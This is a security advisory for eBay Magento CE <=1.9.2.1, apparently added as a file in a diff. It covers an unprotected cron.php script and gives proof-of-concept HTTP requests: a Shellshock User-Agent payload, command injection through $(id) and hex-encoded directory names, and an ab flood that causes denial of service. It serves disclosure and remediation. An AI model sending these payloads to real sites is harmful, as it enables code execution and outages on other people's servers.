@@ -1,0 +1,310 @@
+# Exploit Title: eBay Magento CE <= 1.9.2.1 Unrestricted Cron Script (Potential Code Execution / DoS)
+# Date: 06.11.2015
+# Exploit Author: Dawid Golunski
+# Vendor Homepage: http://magento.com
+# Version: eBay Magento CE <= 1.9.2.1 / Magento EE <=1.14.2.1
+# Tested on: Linux
+# Magento reference ID: APPSEC-1045
+
+
+
+=============================================
+- Release date: 06.11.2015
+- Discovered by: Dawid Golunski
+- Severity: Medium
+- eBay Magento ref.: APPSEC-1037
+=============================================
+
+ 
+I. VULNERABILITY
+-------------------------
+
+eBay Magento CE <= 1.9.2.1      Unrestricted Cron Script (Potential Code Execution / DoS)
+eBay Magento EE <= 1.14.2.1
+
+ 
+II. BACKGROUND
+-------------------------
+
+- eBay Magento eCommerce
+
+http://magento.com/
+
+"More than 240,000 merchants worldwide put their trust in our eCommerce 
+software. Magento's eCommerce platform gives you the tools you need to attract 
+more prospects, sell more products, and make more money. It's what we do.
+
+We're owned by eBay, so you know we're eCommerce experts"
+
+ 
+III. INTRODUCTION
+-------------------------
+
+Default installation of ebay Magento eCommerce software comes with a cron.php 
+which allows to manage scheduled tasks. The script is not protected by default 
+and can be publicly accessed.
+
+The publicly exposed cron script poses some potential risks such as exploitation 
+of the well known shellshock vulnerability on unpatched systems leading to code 
+execution. 
+The same script has another potential command execution vector that stems from 
+inproper data sanitisation passed to a shell_exec function.
+
+Apart from the code execution vectors, the script could potentially be used to
+perform a DoS attack due to lack of locking mechanism that prevents the script
+from spawning multiple instances of other helper shell scripts.
+
+
+IV. DESCRIPTION
+-------------------------
+ 
+A) Shellshock vector
+
+Magento cron.php script includes a command execution function that looks as
+follows:
+
+-----[ magento/cron.php ]-----
+
+...
+
+try {
+    if (stripos(PHP_OS, 'win') === false) {
+        $options = getopt('m::');
+        if (isset($options['m'])) {
+            if ($options['m'] == 'always') {
+                $cronMode = 'always';
+            } elseif ($options['m'] == 'default') {
+                $cronMode = 'default';
+            } else {
+                Mage::throwException('Unrecognized cron mode was defined');
+            }
+
+        } else if (!$isShellDisabled) {
+            $fileName = basename(__FILE__);
+            $baseDir = dirname(__FILE__);
+            shell_exec("/bin/sh $baseDir/cron.sh $fileName -mdefault 1 > /dev/null 2>&1 &");
+            shell_exec("/bin/sh $baseDir/cron.sh $fileName -malways 1 > /dev/null 2>&1 &");
+            exit;
+        }
+...
+
+------------------------------
+    
+
+As can be seen, the script runs shell_exec() that loads /bin/sh program which
+is usually a symlink to /bin/bash.
+Although the shellshock vulnerability should be patched, there have been reports 
+of linux distributions that insufficiently patched the issue and remained
+vulnerable. 
+Magento's cron.php could be used as exploit the shellshock vulnerability on 
+unpatched systems which host Magento in CGI mode (which can be easily enabled 
+via .htaccess file provided with Magento).
+
+B) Command injection
+
+The script fails to sanitise the input data coming from $baseDir variable. 
+Input passed to shell execution functions should always be sanitised with 
+escapeshellcmd / escapeshellarg PHP functions. 
+
+Although not exploitable on its own, the lack of escaping could allow to inject 
+some system commands on Magento hosting platforms which have a feature to 
+create backups of directories with a specified name within the document root.
+
+If the provided hosting control panel allows to specify names of such backups,
+a user could potentially inject some malicious data within the directory name 
+which could result in a command injection when cron.php is run from the backup 
+directory.
+The command would execute upon the shell_exec() receiving the malicious data 
+injected with the help of the $baseDir variable.
+
+C) Denial of Service
+
+As the script lacks any access control and a locking mechanism, it is possible 
+to remotely request cron.php multiple times in order to make it spawn 
+multiple instances of the cron.sh script. 
+As a single execution of the script results in 2 cron.sh spawned processes, plus
+a separate CGI process (if website runs as CGI), an attacker could potentially
+overload the Magento site with multiple requests and create a Denial of Service 
+condition by process exhaustion etc.
+
+ 
+V. PROOF OF CONCEPT
+-------------------------
+ 
+A) Shellshock vector exploit
+
+Sending the following request to a CGI-enabled Magento site:
+
+GET /magento/cron.php HTTP/1.1
+Host: victim_magento_site
+User-Agent: () { :; } ; /bin/touch /tmp/magento_cron_hack
+
+will result in a command execution on shellshock affected systems.
+The resul of the above would be:
+
+victim$ ls -l /tmp/magento_cron_hack 
+-rw-rw-rw- 1 www-data www-data 0 Jul 26 09:08 /tmp/magento_cron_hack
+
+
+
+B) Command injection
+
+Due to lack of sanitisation, if a malicious Magento user had access
+to a backup facility, he could potenially create a backup of the magento 
+directory with a command within the name , e.g.: 
+
+$(id)
+
+The user could then request the cron.php script via the following request:
+
+GET /magento/$(id)/cron.php HTTP/1.1
+Host: victim_magento_site
+
+Because of the shell_exec() function in the quoted sourcecode of cron.php:
+
+---
+    $baseDir = dirname(__FILE__);
+    shell_exec("/bin/sh $baseDir/cron.sh $fileName -mdefault 1 > /dev/null 2>&1 &");
+---
+
+it would cause the cron.php script to run the following command:
+
+/bin/sh /var/www/magento/$(id)/cron.sh exec.php -mdefault 1 > /dev/null 2>&1 &
+
+The command would run id program as soon as bash command expansion syntax of 
+$() got evaluated.
+
+
+An attacker could also run more complex commands, by hex encoding disallowed
+characters within directory names (such as '/' directory separator).
+
+For example, he could run the command: 
+
+touch /tmp/magento_exec
+
+
+by encoding it as follows:
+
+echo 'touch /tmp/magento_exec' | hexdump -v -e '"\\\\\\""x" 1/1 "%02x" ""' ${1}
+
+\\\x74\\\x6f\\\x75\\\x63\\\x68\\\x20\\\x2f\\\x74\\\x6d\\\x70\\\x2f\\\x6d\\\x61\\\x67\\\x65\\\x6e\\\x74\\\x6f\\\x5f\\\x65\\\x78\\\x65\\\x63
+
+He could then execute it via a GET request of:
+
+GET /magento/$(`echo%20-e%20\\\x74\\\x6f\\\x75\\\x63\\\x68\\\x20\\\x2f\\\x74\\\x6d\\\x70\\\x2f\\\x6d\\\x61\\\x67\\\x65\\\x6e\\\x74\\\x6f\\\x5f\\\x65\\\x78\\\x65\\\x63`)/exec.php HTTP/1.1
+
+which would execute:
+
+/bin/sh /var/www/magento/exec_poc/$(`echo -e \\\x74\\\x6f\\\x75\\\x63\\\x68\\\x20\\\x2f\\\x74\\\x6d\\\x70\\\x2f\\\x6d\\\x61\\\x67\\\x65\\\x6e\\\x74\\\x6f\\\x5f\\\x65\\\x78\\\x65\\\x63`)/cron.sh exec.php -mdefault 1 > /dev/null 2>&1 &
+
+resulting in creating the PoC file:
+
+victim$ ls -l /tmp/magento_exec 
+-rw-r--r-- 1 www-data www-data 0 Jul 26 11:20 /tmp/magento_exec
+
+
+
+C) Denial of Service
+
+By sending multiple requests to cron.php, for example using apache benchmark
+tool:
+
+attacker$ ab -n 500 -c 30  http://victim_magento_site/magento/cron.php
+
+attacker could exploit the lack of locking to spawn numerous processes,
+potentially leading to resource exhaustion and a DoS condition.
+
+The above command would result in creating multiple instances of the
+cron.php/cron.sh scripts on the target host:
+
+...
+www-data  5529  0.2  1.3 287756  6872 ?        Rl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -mdefault
+www-data  5531  0.2  1.1 288000  5848 ?        Dl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -mdefault
+www-data  5533  0.2  1.2 288000  6432 ?        Dl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -malways
+www-data  5535  0.3  1.2 288000  6484 ?        Dl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -malways
+www-data  5537  0.3  1.5 288768  7740 ?        Dl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -malways
+www-data  5539  0.3  1.3 287524  6956 ?        Rl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -malways
+www-data  5541  0.3  1.4 288768  7168 ?        Dl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -malways
+www-data  5543  0.3  1.4 288288  7188 ?        Rl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -malways
+www-data  5546  0.3  1.4 288512  7188 ?        Rl   10:02   0:00 /usr/bin/php /var/www/magento/cron.php -malways
+www-data  5885  0.0  0.0  17880   460 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5886  0.0  0.0  17880   456 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5887  0.0  0.0  17880   456 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5888  0.0  0.0  17880   440 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5889  0.0  0.0  17880   460 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5890  0.0  0.0  17880   460 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5891  0.0  0.0  17880   460 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5899  0.0  0.0  17880   496 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5900  0.0  0.0  17880   460 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5901  0.0  0.0  17880   496 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -malways 1
+www-data  5904  0.0  0.0  17880   500 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5907  0.0  0.0  17880   496 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -malways 1
+www-data  5909  0.0  0.0  17880   500 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -malways 1
+www-data  5910  0.0  0.0  17880   460 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -malways 1
+www-data  5912  0.0  0.0  17880   464 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+www-data  5913  0.0  0.0  17880   460 ?        S    10:03   0:00 /bin/sh /var/www/magento/cron.sh cron.php -mdefault 1
+...
+
+VI. BUSINESS IMPACT
+-------------------------
+
+The issue has been rated as medium. Depending on the Magento hosting features
+and applied patches code execution could be possible which would increase the 
+risks.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+The latest version of eBay Magento CE (1.9.2.1) was confirmed to contain
+the vulnerable cron.php script.
+The Magento EE versions also contain this problem according to the vendor's
+advisory.
+
+VIII. SOLUTION
+-------------------------
+
+eBay Magento assigned this issue the ID of APPSEC-1037 and supplied a patch
+for it within the SUPEE-6788 patch bundle available on the official website.
+The patch adds sanitisation functions around the shell_exec() code however
+the cron script remains publicly accessible.
+
+It is recommended to protect the cron script by other means.
+For example, the script could require a key supplied together with a GET
+request to proceed with the execution which is commonly used with other
+major open source solutions.
+The easiest way would also be restricting acess to the script to only
+certain IPs or localhost within the web server configuration.
+
+ 
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com/advisories/Magento-Unrestricted-Cron-Script-Vulnerability.txt
+
+Oficial eBay Magento website:
+http://magento.com/
+
+Patch 'SUPEE-6788 Patch Bundle', addressing 'XXE/XEE Attack on Zend XML 
+Functionality Using Multibyte Payloads' (APPSEC-1037) is available at:
+ 
+https://magento.com/security/patches/supee-6788
+
+
+X. CREDITS
+-------------------------
+
+The vulnerabilities have been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+Nov 6th, 2015:  Advisory released
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
